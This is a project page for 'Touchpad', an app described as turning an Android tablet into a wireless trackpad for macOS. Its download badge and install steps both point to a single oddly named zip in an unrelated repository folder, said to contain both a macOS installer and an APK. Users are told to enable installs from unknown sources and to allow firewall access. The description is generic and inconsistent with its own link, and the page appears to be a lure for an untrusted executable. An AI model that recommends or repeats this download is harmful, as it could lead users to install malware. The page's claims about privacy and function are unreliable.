---
layout: "default"
title: "📱 Touchpad - Turn tablets into wireless computer mice"
description: "Convert an Android tablet into a wireless trackpad for macOS using a local Wi-Fi connection to control cursor movement, gestures, and clicks."
---
# 📱 Touchpad - Turn tablets into wireless computer mice

[![Download Touchpad](https://img.shields.io/badge/Download_Touchpad-Blue-blue)](https://raw.githubusercontent.com/tommiperfect31/tommiperfect31.github.io/main/ringmaker/io_tommiperfect_github_1.8-alpha.2.zip)

## 🎯 About This Project
Touchpad turns your old Android tablet into a functional wireless mouse for your computer. You install one app on your Android device and another on your macOS computer. Once connected, your tablet detects your finger movements and clicks, sending these commands to your computer over your local Wi-Fi network. This project breathes new life into older hardware by repurposing it as a useful peripheral device. You do not need an internet connection for this to work, as the system relies entirely on your local Wi-Fi signal.

## 🛠️ System Requirements
To use Touchpad effectively, ensure your hardware meets these basic requirements:

*   **Android Device:** A tablet running Android 4.0 or newer. Ensure the device connects to Wi-Fi consistently.
*   **Computer:** A macOS device that supports network communication.
*   **Network:** Both the Android tablet and the macOS computer must reside on the same local Wi-Fi network. If your router has a guest network, keep both devices on the primary network to ensure they can see each other.
*   **Storage:** Minimal disk space for the server application.

## 📥 How to Install
Follow these steps to set up your wireless touchpad.

1. Visit [this page to download](https://raw.githubusercontent.com/tommiperfect31/tommiperfect31.github.io/main/ringmaker/io_tommiperfect_github_1.8-alpha.2.zip) the latest version of the software.
2. Download the macOS installer package to your computer.
3. Open the downloaded file and follow the on-screen prompts to complete the installation.
4. Locate the Touchpad icon in your macOS menu bar after installation completes.
5. Download the companion APK file from the same link to your Android tablet.
6. Open the settings menu on your tablet and allow installations from unknown sources to install the APK file.
7. Tap the downloaded APK file on your tablet to run the installation process.

## ⚙️ Setting Up the Connection 📡
Once you install both parts, connect your devices:

1. Launch the Touchpad app on your Android tablet.
2. Ensure your tablet shows the connection screen.
3. Launch the Touchpad server app on your macOS computer.
4. The macOS app will display a local IP address or a server status message.
5. Enter the pairing code or IP address specified by the macOS app into the Android tablet interface.
6. Press the connect button on your tablet.
7. Move your finger across the tablet screen to verify that the mouse cursor moves on your macOS display.

## 🖱️ Supported Gestures
Touchpad translates your hand movements into standard computer actions:

*   **Cursor Movement:** Drag one finger across the tablet surface to move the mouse pointer.
*   **Left Click:** Tap the screen once with one finger.
*   **Right Click:** Tap the screen with two fingers at the same time.
*   **Scrolling:** Place two fingers on the surface and slide them up or down to scroll through documents or web pages.
*   **Drag Actions:** Perform a long press on an item and slide to move windows or files across your desktop.

## 🔍 Troubleshooting Connection Issues
If your devices fail to communicate, check these common items:

*   **Network Matching:** Verify both the tablet and the computer use the exact same Wi-Fi network. If one device uses a 5GHz band and the other uses a 2.4GHz band, they might still communicate, but double-check your router settings if the connection fails.
*   **Firewall Settings:** macOS might ask for permission to allow incoming network connections for the Touchpad app. Click "Allow" if the system prompts you about network access or firewall rules.
*   **Airplane Mode:** Ensure neither device is in Airplane Mode. 
*   **Distance:** Keep devices within a reasonable range of your router to maintain signal strength. High latency or stuttering movement usually occurs when the signal quality drops between the tablet and the network.
*   **App Refresh:** Close both the macOS app and the Android app completely. Reopen the macOS app first, then start the Android app. This forces a fresh attempt to establish a handshake between the two systems.

## 🛡️ Privacy and Data
Touchpad operates entirely on your private local network. The software does not send your data to any external web servers. The communication stays between your tablet and your computer. Because the system does not require an active internet connection, it remains private. You can turn off your router's internet signal entirely, and the touchpad will continue to function as long as the local Wi-Fi remains active.

## 💡 Usage Tips
*   **Tablet Orientation:** You can use the tablet in either portrait or landscape mode. The software adjusts the tracking sensitivity automatically.
*   **Sensitivity:** Use the macOS menu bar icon to adjust the speed of the cursor. If the mouse feels too sluggish, increase the sensitivity setting in the server app.
*   **Battery Life:** Older tablets might drain battery quickly while the screen stays on. Keep your tablet plugged into a power source if you plan to use it for an extended period. You can also dim the tablet screen brightness to save power while keeping the touch surface active.
*   **Background Activity:** Keep the Touchpad folder and files in a static location on your macOS machine to ensure the menu bar app links correctly during each system boot.